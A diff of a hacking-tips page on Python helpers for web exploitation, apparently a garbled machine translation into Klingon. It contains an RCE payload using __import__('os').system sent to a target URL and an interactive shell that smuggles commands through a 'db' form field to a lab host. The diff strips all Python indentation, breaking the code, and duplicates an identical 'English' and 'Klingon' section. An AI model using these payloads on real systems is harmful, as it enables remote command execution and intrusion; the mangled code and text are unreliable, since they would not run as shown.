@@ -23,7 +23,6 @@ Get Access Today:
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## Python Requests
-
 ```python
 import requests
 
@@ -67,64 +66,93 @@ proxies = {}
 s = requests.Session()
 
 def register(username, password):
-    resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
-    return resp
+resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
+return resp
 
 def login(username, password):
-    resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
-    return resp
+resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
+return resp
 
 def get_info(name):
-    resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
-    guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
-    return guid
+resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
+guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
+return guid
 
 def upload(guid, filename, data):
-    resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
-    guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
-    return guid
+resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
+guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
+return guid
 
 def json_search(guid, search_string):
-    resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
-    return resp.json()
+resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
+return resp.json()
 
 def get_random_string(guid, path):
-    return ''.join(random.choice(string.ascii_letters) for i in range(10))
+return ''.join(random.choice(string.ascii_letters) for i in range(10))
 ```
-
 ## Python cmd to exploit an RCE
 
+### English
+
+To exploit a Remote Code Execution (RCE) vulnerability using Python, you can use the following command:
+
+```python
+import requests
+
+url = "http://target.com/vulnerable_endpoint"
+payload = "__import__('os').system('command_to_execute')"
+
+response = requests.get(url + "?param=" + payload)
+print(response.text)
+```
+
+Replace `http://target.com/vulnerable_endpoint` with the URL of the vulnerable endpoint and `command_to_execute` with the command you want to run on the target system.
+
+### Klingon
+
+To exploit a Remote Code Execution (RCE) vulnerability using Python, you can use the following command:
+
+```python
+import requests
+
+url = "http://target.com/vulnerable_endpoint"
+payload = "__import__('os').system('command_to_execute')"
+
+response = requests.get(url + "?param=" + payload)
+print(response.text)
+```
+
+Replace `http://target.com/vulnerable_endpoint` with the URL of the vulnerable endpoint and `command_to_execute` with the command you want to run on the target system.
 ```python
 import requests
 import re
 from cmd import Cmd
 
 class Terminal(Cmd):
-    prompt = "Inject => "
+prompt = "Inject => "
 
-    def default(self, args):
-        output = RunCmd(args)
-        print(output)
+def default(self, args):
+output = RunCmd(args)
+print(output)
 
 def RunCmd(cmd):
-    data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
-    r = requests.post('http://10.10.10.127/select', data=data)
-    page = r.text
-    m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
-    if m:
-        return m.group(1)
-    else:
-        return 1
-    
+data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
+r = requests.post('http://10.10.10.127/select', data=data)
+page = r.text
+m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
+if m:
+return m.group(1)
+else:
+return 1
+
 
 term = Terminal()
 term.cmdloop()
 ```
-
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) vIghoS 'ej **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
